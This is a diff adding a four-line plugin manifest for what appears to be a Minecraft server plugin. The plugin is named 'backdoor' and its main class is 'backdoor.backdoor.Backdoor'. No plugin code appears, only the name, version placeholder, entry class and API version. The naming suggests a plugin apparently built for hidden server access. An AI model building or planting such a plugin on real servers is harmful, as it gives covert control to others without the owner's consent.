@@ -1,0 +1,4 @@
+name: backdoor
+version: '${project.version}'
+main: backdoor.backdoor.Backdoor
+api-version: '1.20'
